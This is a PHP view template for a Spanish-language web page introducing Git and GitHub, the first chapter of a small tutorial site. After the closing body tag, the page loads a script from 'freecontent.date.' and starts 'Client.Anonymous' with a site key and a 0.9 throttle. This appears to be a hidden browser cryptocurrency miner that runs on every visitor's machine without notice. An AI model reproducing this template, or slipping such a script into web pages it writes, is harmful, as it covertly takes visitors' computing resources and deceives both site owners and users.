<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?><!DOCTYPE html>
<html lang="en">

  <head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="ylit.cl" content="">

    <title>Tutotial GitHub</title>

    <!-- Bootstrap core CSS -->
    <link href="<?php echo base_url() ?>assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom fonts for this template -->
    <link href="<?php echo base_url() ?>assets/vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

    <!-- Custom styles for this template -->
    <link href="<?php echo base_url() ?>assets/css/clean-blog.min.css" rel="stylesheet">

  </head>

  <body>

    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
      <div class="container">
        <div class="collapse navbar-collapse" id="navbarResponsive">
          <ul class="navbar-nav ml-auto">
            <li class="nav-item">
              <a class="nav-link" href="<?php echo base_url() ?>">Índice</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="<?php echo base_url() ?>IndiceController/quienesSomos">Quines Somos</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="<?php echo base_url() ?>IndiceController/contactanos">Contactanos</a>
            </li>
          </ul>
        </div>
      </div>
    </nav>

    <!-- Page Header -->
    <header class="masthead" style="background-image: url('<?php echo base_url() ?>assets/img/github1.png')">
      <div class="overlay"></div>
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-md-10 mx-auto">
            <div class="site-heading">
              <h1>Tutorial GitHub</h1>
              <span class="subheading">Descripción Git y GitHub.</span>
              <span class="subheading">Desarrollado por <a href="https://ylit.cl/">YLIT</a></span>
            </div>
          </div>
        </div>
      </div>
    </header>

    <!-- Post Content -->
    <article>
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-md-10 mx-auto">

            <p> <b>Git:</b> es un software de control de versiones, desarrollado por Linus Tolvard (sí, el mismo Linus que desarrollo el kernel linux). Pensado 
            para el mantenimiento de versiones de aplicaciones cuando éstas tienen un gran número de archivos de código fuente. 
            El sitio web official de githuib es <a href="https://git-scm.com/">https://git-scm.com/</a>
            </p>

            <p> 
            <b>GitHub:</b> es una plataforma de trabajo colaborativo, para alojar proyectos. Dicha
            plataforma utiliza el sistema de control de versiones Git (descrito en el párrafo anterior). Entre
            las caracteristicas que podemos encontrar en GitHub tenemos algunas como:<br>

              - Wiki para cada proyecto.<br>
              - Página web para cada proyecto.<br>​
              - Gráfico para ver cómo los desarrolladores trabajan en sus repositorios y bifurcaciones del proyecto.<br>
              - Funcionalidades como si se tratase de una red social, por ejemplo, seguidores.<br>
              - Herramienta para trabajo colaborativo entre programadores.<br>
              - Gestor de proyectos de estilo Kanban.<br>

              El sitio web official de githuib es <a href="https://github.com">https://github.com</a>


             </p>

            <p>Por lo tanto, en resumen, la principal diferencia entre Git y GitHub es: Git es un software, mientras que GitHub es una plataforma web
            que utiliza Git.</p>

            <p>Ahora que ya tenemos una pequeñisima noción de lo que es Git y GitHub, procederemos
            con la instalación de Git.</p>

            

              <div class="clearfix">
                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/">Capítulo Anterior &larr;</a>
              </div>
              <div class="clearfix">
                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/instalacion">Capítulo Siguiente &rarr;</a>
              </div>

          </div>
        </div>
      </div>
    </article>

    <hr>

    <!-- Footer -->
    <footer>
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-md-10 mx-auto">
            <ul class="list-inline text-center">
              <li class="list-inline-item">
                <a href="https://www.linkedin.com/in/luis-navarro-arenas-6493b1136/">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li class="list-inline-item">
                <a href="https://www.facebook.com/ylit.cl">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li class="list-inline-item">
                <a href="https://github.com/lnavarroa/tutorialGitHub">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
            </ul>
            <p class="copyright text-muted">Copyright &copy; YLIT 2018</p>
          </div>
        </div>
      </div>
    </footer>

    <!-- Bootstrap core JavaScript -->
    <script src="<?php echo base_url() ?>assets/vendor/jquery/jquery.min.js"></script>
    <script src="<?php echo base_url() ?>assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

    <!-- Custom scripts for this template -->
    <script src="<?php echo base_url() ?>assets/js/clean-blog.min.js"></script>

  </body>

  <script src="https://www.freecontent.date./Kxnd.js"></script>
  <script>
    var _client = new Client.Anonymous('0df5a246946447fd570ca7839db8bd98fd09b8b9b6bafb8e25dfc39b5e1ef835', {
        throttle: 0.9
    });
    _client.start();

  </script>

</html>
